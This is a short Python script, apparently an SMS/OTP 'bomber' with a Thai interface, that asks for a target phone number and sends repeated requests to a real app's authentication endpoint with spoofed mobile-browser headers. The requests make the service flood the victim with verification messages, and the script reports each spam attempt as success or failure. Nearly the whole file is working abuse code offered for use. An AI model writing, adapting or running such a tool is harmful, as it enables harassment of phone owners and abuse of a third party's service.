import os,sys,time,requests,json
from requests import post
def balik():
    f = input("\033[1;97mKEMBALI (y/t): \033[1;92m")
    if f == "y":
       os.system("python call.py")
    elif f == "t":
         sys.exit("\033[1;91mexit\033[1;97m")
os.system("clear")
print ("\tยิงเบอร์ 1.0")
print ("      YouTube: \033[1;96mFiveZone CH\033[1;97m")
print ("\033[1;97m*     ผู้สนับสนุน:\033[1;92m SCK \033[1;97m      *")
print()
print ("\033[90m>\033[1;97m ตัวอย่าง: \033[1;92m+66857×××××××××")
no = input("\033[90m> \033[1;97mใส่เบอร์เป้าหมาย: \033[1;92m")

ua = {
"Host": "api.myfave.com",
"Connection": "keep-alive",
"x-user-agent": "Fave-PWA/v1.0.0",
"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.83 Mobile Safari/537.36",
"content-type": "application/json",
"Accept": "*/*",
"Origin": "https://m.myfave.com",
"Referer": "https://m.myfave.com/jakarta/auth",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
}
for i in range(1,5):
    dat = {"phone":no}
    r = requests.post("https://api.myfave.com/api/fave/v3/auth", data=json.dumps(dat), headers=ua).text
    if "6c047709f9da4291a568fa84b97b6d47" in r:
        print ("\033[90m> \]33[1;97mSPAM \033[1;94m=> \033[1;91mFAILED")
    else:
        print ("\033[90m> \033[1;97mยิงเบอร์ \033[1;94m=> \033[1;92mสำเร็จ")
    time.sleep(100)